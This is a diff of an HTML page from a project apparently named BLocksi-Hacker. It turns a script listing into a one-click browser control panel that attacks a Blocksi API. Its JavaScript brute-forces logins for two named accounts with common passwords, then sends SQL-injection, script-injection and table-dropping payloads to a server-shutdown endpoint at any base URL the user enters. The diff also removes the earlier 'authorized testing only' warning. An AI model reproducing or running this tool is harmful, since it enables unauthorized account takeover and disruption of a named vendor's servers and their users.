@@ -2,86 +2,99 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>BLocksi-Hacker Penetration Testing Tool</title>
+  <title>BLocksi-Hacker Control Panel</title>
   <style>
     body { font-family: Arial, sans-serif; background: #fafafa; }
     .container { max-width: 700px; margin: 40px auto; background: #fff; padding: 2em; border-radius: 8px; box-shadow: 0 0 10px #eee;}
     h1 { color: #2d3748;}
-    code, pre { background: #f6f8fa; padding: 1em; border-radius: 6px; display: block;}
+    button { margin: 10px 0; padding: 10px 20px; font-size: 16px;}
+    pre { background: #f6f8fa; padding: 1em; border-radius: 6px;}
     .note { background: #fffae6; border-left: 4px solid #ffe066; padding: 1em; margin: 1em 0;}
+    .section-label { font-weight: bold; margin-top: 1em; margin-bottom: 0.2em; display: block;}
+    #output { min-height: 100px; margin-top: 15px; }
+    input[type="text"] { font-size: 16px; padding: 6px; width: 350px; }
+    .published-url { margin: 1em 0; font-size: 1.1em; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Blocksi Hacker: Penetration Testing Tool</h1>
-    <p>
-      Welcome to the <strong>BLocksi-Hacker</strong> project. This repository contains an ethical penetration testing script designed for Blocksi API endpoints.
-    </p>
-    <div class="note">
-      <strong>Note:</strong> This tool is for authorized testing only. Run it in a safe environment. Do not use against production systems or without proper permission!
+    <h1>BLocksi-Hacker Web Control Panel</h1>
+    <div class="published-url">
+      <strong>Published Site:</strong>
+      <a href="https://r3s3t666.github.io/BLocksi-Hacker/" target="_blank">https://r3s3t666.github.io/BLocksi-Hacker/</a>
     </div>
-    <h2>How to Use</h2>
-    <ol>
-      <li>Clone this repo:
-        <pre>git clone https://github.com/R3S3T666/BLocksi-Hacker.git</pre>
-      </li>
-      <li>Install dependencies (requires Node.js):
-        <pre>npm install axios</pre>
-      </li>
-      <li>Run the script:
-        <pre>node penetrationTest.js</pre>
-      </li>
-    </ol>
-    <h2>Penetration Tester Script</h2>
-    <pre>
-const axios = require('axios');
+    <div class="note">
+      <strong>Note:</strong> All tests run from your browser. No downloads or installation needed. Make sure your API endpoint is accessible from a browser (CORS must be enabled).
+    </div>
+    <label for="apiBase"><b>API Base URL:</b></label>
+    <input type="text" id="apiBase" value="https://test.blocksi.com/api" size="40">
+    <br><br>
+    <span class="section-label">Step 1: Brute Force Login Test</span>
+    <button onclick="bruteForceLogin()">Run Brute Force Login</button>
+    <span style="color:#888; font-size:13px; display:block; margin-bottom:1em;">Attempts multiple username/password combinations to test login security.</span>
 
-const API_BASE = 'https://test.blocksi.com/api'; // Change to your authorized test endpoint
-const USERS = ['admin@blocksi.com', 'user@blocksi.com'];
-const PASSWORDS = ['123456', 'admin', 'password', 'letmein'];
+    <span class="section-label">Step 2: Fuzz Vulnerability Test</span>
+    <button onclick="fuzzEndpoint()">Run Fuzz Endpoint Test</button>
+    <span style="color:#888; font-size:13px; display:block; margin-bottom:1em;">Sends typical attack payloads to the shutdown endpoint to check input validation.</span>
 
-// Brute-force login test
-async function bruteForceLogin() {
-    for (const email of USERS) {
-        for (const password of PASSWORDS) {
-            try {
-                const response = await axios.post(`${API_BASE}/auth/login`, { email, password });
-                if (response.data.accessToken) {
-                    console.log(`Potential valid login: ${email}:${password}`);
-                }
-            } catch (err) {
-                console.log(`Attempt failed for ${email}:${password}: ${err.response?.status}`);
-            }
-        }
-    }
-}
-
-// Input fuzzing test
-async function fuzzEndpoint() {
-    const fuzzData = [
-        { serverId: "' OR '1'='1" },
-        { serverId: "<script>alert(1)</script>" },
-        { serverId: "1; DROP TABLE servers;" }
-    ];
-    for (const data of fuzzData) {
-        try {
-            const response = await axios.post(`${API_BASE}/servers/shutdown`, data);
-            console.log(`Fuzz input ${JSON.stringify(data)}: ${response.status}`);
-        } catch (err) {
-            console.log(`Fuzz input failed: ${JSON.stringify(data)} - ${err.response?.status}`);
-        }
-    }
-}
-
-// Main routine
-(async function main() {
-    await bruteForceLogin();
-    await fuzzEndpoint();
-})();
-    </pre>
-    <p>
-      For more details and the latest version, see the <a href="https://github.com/R3S3T666/BLocksi-Hacker">GitHub repository</a>.
-    </p>
+    <pre id="output"></pre>
   </div>
+  <script>
+    const USERS = ['admin@blocksi.com', 'user@blocksi.com'];
+    const PASSWORDS = ['123456', 'admin', 'password', 'letmein'];
+    const FUZZ_DATA = [
+      { serverId: "' OR '1'='1" },
+      { serverId: "<script>alert(1)</script>" },
+      { serverId: "1; DROP TABLE servers;" }
+    ];
+    const output = document.getElementById('output');
+
+    function log(msg) {
+      output.textContent += msg + '\n';
+    }
+
+    async function bruteForceLogin() {
+      output.textContent = 'Starting brute force login...\n';
+      const apiBase = document.getElementById('apiBase').value;
+      for (const email of USERS) {
+        for (const password of PASSWORDS) {
+          try {
+            const res = await fetch(apiBase + '/auth/login', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ email, password })
+            });
+            let data = await res.json();
+            if (data.accessToken) {
+              log(`✅ Potential valid login: ${email}:${password}`);
+            } else {
+              log(`❌ Attempt failed for ${email}:${password}: ${res.status}`);
+            }
+          } catch (err) {
+            log(`❌ Network error for ${email}:${password}: ${err}`);
+          }
+        }
+      }
+      log('Brute force login complete.');
+    }
+
+    async function fuzzEndpoint() {
+      output.textContent = 'Starting input fuzzing...\n';
+      const apiBase = document.getElementById('apiBase').value;
+      for (const data of FUZZ_DATA) {
+        try {
+          const res = await fetch(apiBase + '/servers/shutdown', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+          log(`Fuzz input ${JSON.stringify(data)}: ${res.status}`);
+        } catch (err) {
+          log(`Fuzz input failed: ${JSON.stringify(data)} - ${err}`);
+        }
+      }
+      log('Fuzzing complete.');
+    }
+  </script>
 </body>
 </html>
